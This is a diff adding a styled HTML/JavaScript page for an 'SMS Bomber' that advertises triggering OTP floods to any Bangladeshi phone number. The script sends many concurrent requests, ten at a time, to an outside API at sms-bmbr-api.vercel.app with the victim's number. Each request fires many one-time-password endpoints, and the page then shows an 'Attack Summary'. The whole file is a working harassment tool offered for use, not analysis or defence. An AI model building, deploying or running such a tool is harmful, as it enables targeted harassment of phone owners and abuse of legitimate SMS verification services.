@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SMS Bomber</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #0f1117;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #e8edf5;
+      padding: 24px;
+      line-height: 1.5;
+    }
+    body::before {
+      content: '';
+      position: fixed;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle at 30% 40%, rgba(240, 179, 75, 0.04) 0%, transparent 50%),
+                  radial-gradient(circle at 70% 60%, rgba(232, 131, 74, 0.04) 0%, transparent 50%);
+      animation: drift 20s infinite alternate ease-in-out;
+      z-index: -1;
+    }
+    @keyframes drift {
+      0% { transform: translate(0, 0) rotate(0deg); }
+      100% { transform: translate(2%, 3%) rotate(3deg); }
+    }
+    .card {
+      background: rgba(22, 25, 35, 0.88);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border-radius: 40px;
+      padding: 44px 40px;
+      max-width: 640px;
+      width: 100%;
+      box-shadow: 0 30px 80px rgba(0,0,0,0.7), inset 0 1px 1px rgba(255,255,255,0.04);
+      border: 1px solid rgba(255,255,255,0.03);
+      transition: transform 0.3s ease, box-shadow 0.4s ease;
+      animation: cardIn 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+    .card:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 40px 90px rgba(0,0,0,0.85);
+    }
+    @keyframes cardIn {
+      0% { opacity: 0; transform: scale(0.96) translateY(20px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 8px;
+    }
+    .header-icon {
+      font-size: 32px;
+      color: #f0b34b;
+      filter: drop-shadow(0 0 10px rgba(240,179,75,0.25));
+    }
+    h1 {
+      font-size: 30px;
+      font-weight: 700;
+      background: linear-gradient(135deg, #f0b34b 0%, #ff7a5c 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -0.5px;
+    }
+    .subtitle {
+      font-size: 15px;
+      color: #9aa2b5;
+      margin-bottom: 30px;
+      padding-left: 52px;
+      border-left: 3px solid #f0b34b;
+      padding-left: 16px;
+      opacity: 0.9;
+    }
+    .subtitle i {
+      margin-right: 8px;
+      color: #f0b34b;
+    }
+    .form-group {
+      margin-bottom: 22px;
+    }
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      color: #c8cedb;
+      margin-bottom: 6px;
+      letter-spacing: 0.2px;
+    }
+    label i {
+      margin-right: 8px;
+      color: #f0b34b;
+      width: 18px;
+    }
+    .input-wrapper {
+      position: relative;
+    }
+    .input-wrapper i {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #5a6279;
+      font-size: 16px;
+      pointer-events: none;
+    }
+    input[type="text"],
+    input[type="number"] {
+      width: 100%;
+      padding: 14px 18px 14px 44px;
+      border: 1px solid #2e3346;
+      border-radius: 20px;
+      background: #1a1d27;
+      color: #f0f0f0;
+      font-size: 16px;
+      transition: border 0.25s, box-shadow 0.25s, background 0.25s;
+      outline: none;
+    }
+    input:focus {
+      border-color: #f0b34b;
+      background: #1e212e;
+      box-shadow: 0 0 0 4px rgba(240, 179, 75, 0.12);
+    }
+    input::placeholder {
+      color: #4f5770;
+    }
+    .input-row {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+    .input-row .form-group {
+      flex: 1;
+      min-width: 120px;
+    }
+    .badge {
+      display: inline-block;
+      background: #2a2f40;
+      padding: 4px 14px;
+      border-radius: 40px;
+      font-size: 12px;
+      font-weight: 500;
+      color: #a8b1c9;
+      letter-spacing: 0.3px;
+    }
+    .badge i {
+      margin-right: 6px;
+      font-size: 11px;
+      color: #f0b34b;
+    }
+    .btn {
+      width: 100%;
+      padding: 16px 24px;
+      background: linear-gradient(135deg, #f0b34b, #e8834a);
+      border: none;
+      border-radius: 60px;
+      font-size: 18px;
+      font-weight: 600;
+      color: #14161c;
+      cursor: pointer;
+      transition: all 0.25s;
+      letter-spacing: 0.3px;
+      box-shadow: 0 8px 28px rgba(232, 131, 74, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+    .btn i {
+      font-size: 18px;
+      transition: transform 0.3s;
+    }
+    .btn:hover:not(:disabled) {
+      transform: scale(1.02);
+      box-shadow: 0 12px 36px rgba(232, 131, 74, 0.5);
+    }
+    .btn:hover:not(:disabled) i {
+      transform: translateX(4px) rotate(-10deg);
+    }
+    .btn:active:not(:disabled) {
+      transform: scale(0.96);
+    }
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .result-box {
+      margin-top: 32px;
+      padding: 22px 24px;
+      border-radius: 24px;
+      background: rgba(0, 0, 0, 0.35);
+      border-left: 5px solid #f0b34b;
+      animation: fadeSlide 0.5s ease;
+    }
+    .result-box.error {
+      border-left-color: #ff5c5c;
+      background: rgba(255, 92, 92, 0.08);
+    }
+    .result-box.success {
+      border-left-color: #4caf50;
+      background: rgba(76, 175, 80, 0.08);
+    }
+    @keyframes fadeSlide {
+      0% { opacity: 0; transform: translateY(18px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+    .result-title {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .result-title i {
+      font-size: 22px;
+    }
+    .result-title .fa-circle-check { color: #4caf50; }
+    .result-title .fa-circle-xmark { color: #ff5c5c; }
+    .result-stats {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 14px 30px;
+      margin-top: 8px;
+    }
+    .stat-item {
+      font-size: 15px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .stat-item i {
+      width: 20px;
+      color: #f0b34b;
+      font-size: 14px;
+    }
+    .stat-item strong {
+      color: #f0b34b;
+      font-weight: 600;
+    }
+    .stat-item .green { color: #6fcf97; }
+    .stat-item .red { color: #ff5c5c; }
+    .detail-list {
+      margin-top: 16px;
+      max-height: 180px;
+      overflow-y: auto;
+      font-size: 13px;
+      color: #b0b8c9;
+      background: rgba(0,0,0,0.2);
+      padding: 12px 16px;
+      border-radius: 16px;
+      border: 1px solid #282e3d;
+    }
+    .detail-list::-webkit-scrollbar {
+      width: 5px;
+    }
+    .detail-list::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    .detail-list::-webkit-scrollbar-thumb {
+      background: #4a5064;
+      border-radius: 10px;
+    }
+    .detail-item {
+      padding: 6px 0;
+      border-bottom: 1px solid #252a38;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .detail-item:last-child {
+      border-bottom: none;
+    }
+    .detail-item i {
+      color: #f0b34b;
+      font-size: 12px;
+      width: 16px;
+    }
+    .detail-item .fa-check-circle { color: #4caf50; }
+    .detail-item .fa-times-circle { color: #ff5c5c; }
+    .footer {
+      margin-top: 36px;
+      text-align: center;
+      font-size: 14px;
+      color: #5f6679;
+      border-top: 1px solid #262b3b;
+      padding-top: 22px;
+      width: 100%;
+      max-width: 640px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px 28px;
+    }
+    .footer a {
+      color: #a8b1c9;
+      text-decoration: none;
+      transition: color 0.2s;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .footer a:hover {
+      color: #f0b34b;
+    }
+    .footer i {
+      font-size: 14px;
+    }
+    .footer .copyright {
+      color: #4f5770;
+      font-size: 13px;
+    }
+    .footer .credit {
+      color: #f0b34b;
+      font-weight: 500;
+    }
+    .footer .credit a {
+      color: #f0b34b;
+      text-decoration: underline;
+    }
+    .loader {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.8s ease infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    @media (max-width: 500px) {
+      .card { padding: 28px 18px; }
+      h1 { font-size: 24px; }
+      .header-icon { font-size: 26px; }
+      .subtitle { font-size: 13px; padding-left: 0; border-left: none; }
+      .input-row { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <span class="header-icon"><i class="fas fa-bolt"></i></span>
+    <h1>SMS Bomber</h1>
+  </div>
+  <div class="subtitle">
+    <i class="fas fa-arrow-right"></i> Trigger OTP floods to any Bangladeshi number
+  </div>
+
+  <form id="bomber-form" onsubmit="return handleSubmit(event)">
+    <div class="form-group">
+      <label for="phone"><i class="fas fa-phone-alt"></i>Phone Number (11 digits)</label>
+      <div class="input-wrapper">
+        <i class="fas fa-mobile-alt"></i>
+        <input type="text" id="phone" name="phone" placeholder="e.g. 01712345678" required pattern="[0-9]{11}" maxlength="11" autofocus />
+      </div>
+    </div>
+
+    <div class="input-row">
+      <div class="form-group">
+        <label for="count"><i class="fas fa-repeat"></i>Number of times</label>
+        <div class="input-wrapper">
+          <i class="fas fa-sync-alt"></i>
+          <input type="number" id="count" name="count" value="1" min="1" max="100" step="1" />
+        </div>
+      </div>
+      <div class="form-group" style="flex: 0 0 auto; align-self: flex-end;">
+        <span class="badge"><i class="fas fa-info-circle"></i>Max 100</span>
+      </div>
+    </div>
+
+    <button type="submit" id="submitBtn" class="btn">
+      <i class="fas fa-rocket"></i> Launch Attack
+    </button>
+  </form>
+
+  <div id="resultContainer"></div>
+</div>
+
+<div class="footer">
+  <span><i class="fas fa-code"></i> Powered by <a href="https://sms-bmbr-api.vercel.app" target="_blank">SMS Bomber API</a></span>
+  <span class="copyright"><i class="far fa-copyright"></i> <span id="year"></span> All rights reserved</span>
+  <span class="credit"><i class="fas fa-user-astronaut"></i> Created by <a href="https://t.me/infinity_codex" target="_blank">Infinity Codex</a></span>
+</div>
+
+<script>
+  document.getElementById('year').textContent = new Date().getFullYear();
+
+  async function handleSubmit(event) {
+    event.preventDefault();
+    const phoneInput = document.getElementById('phone');
+    const countInput = document.getElementById('count');
+    const submitBtn = document.getElementById('submitBtn');
+    const resultContainer = document.getElementById('resultContainer');
+
+    const phone = phoneInput.value.replace(/\D/g, '');
+    let count = parseInt(countInput.value) || 1;
+    if (count < 3) count = 3;
+    if (count > 70) count = 70;
+
+    if (phone.length !== 11) {
+      resultContainer.innerHTML = `
+        <div class="result-box error">
+          <div class="result-title" style="color:#ff5c5c;">
+            <i class="fas fa-circle-xmark"></i> Error
+          </div>
+          <p>Please enter a valid 11‑digit phone number.</p>
+        </div>
+      `;
+      return false;
+    }
+
+    // Disable button and show loader
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = `<span class="loader"></span> Sending...`;
+    resultContainer.innerHTML = '';
+
+    const details = [];
+    let totalEndpoints = 0;
+    let successCount = 0;
+
+    // Helper: call the API for one iteration
+    async function callOnce(iteration) {
+      try {
+        const url = `https://sms-bmbr-api.vercel.app/?sms=${encodeURIComponent(phone)}`;
+        const response = await fetch(url);
+        const data = await response.json();
+        if (response.ok && data && data.total !== undefined) {
+          totalEndpoints += data.total;
+          successCount++;
+          details.push(`Call ${iteration}: Triggered ${data.total} endpoints.`);
+        } else {
+          details.push(`Call ${iteration}: Error - ${data?.error || 'Unknown error'}`);
+        }
+      } catch (err) {
+        details.push(`Call ${iteration}: Error - ${err.message || 'Network error'}`);
+      }
+    }
+
+    // Send requests with concurrency limit (max 10 at a time)
+    const concurrency = 10;
+    const queue = [];
+    for (let i = 1; i <= count; i++) {
+      queue.push(i);
+    }
+
+    const workers = Array.from({ length: Math.min(concurrency, count) }, async () => {
+      while (queue.length) {
+        const iter = queue.shift();
+        await callOnce(iter);
+      }
+    });
+
+    await Promise.all(workers);
+
+    // Build result display
+    let html = `
+      <div class="result-box success">
+        <div class="result-title">
+          <i class="fas fa-circle-check"></i> Attack Summary
+        </div>
+        <div class="result-stats">
+          <div class="stat-item"><i class="fas fa-phone"></i> <strong>${phone}</strong></div>
+          <div class="stat-item"><i class="fas fa-repeat"></i> Attempts: <strong>${count}</strong></div>
+          <div class="stat-item"><i class="fas fa-check-circle green"></i> API calls successful: <strong class="green">${successCount}</strong> / ${count}</div>
+          <div class="stat-item"><i class="fas fa-bolt"></i> Total endpoints triggered: <strong style="color:#f0b34b;">${totalEndpoints}</strong></div>
+        </div>
+        <div class="detail-list">
+          ${details.map(line => {
+            const isError = line.includes('Error');
+            return `<div class="detail-item">
+              <i class="fas ${isError ? 'fa-times-circle' : 'fa-check-circle'}" style="color:${isError ? '#ff5c5c' : '#4caf50'};"></i>
+              ${line}
+            </div>`;
+          }).join('')}
+        </div>
+      </div>
+    `;
+
+    resultContainer.innerHTML = html;
+
+    // Restore button
+    submitBtn.disabled = false;
+    submitBtn.innerHTML = `<i class="fas fa-rocket"></i> Launch Attack`;
+
+    return false;
+  }
+</script>
+</body>
+</html>
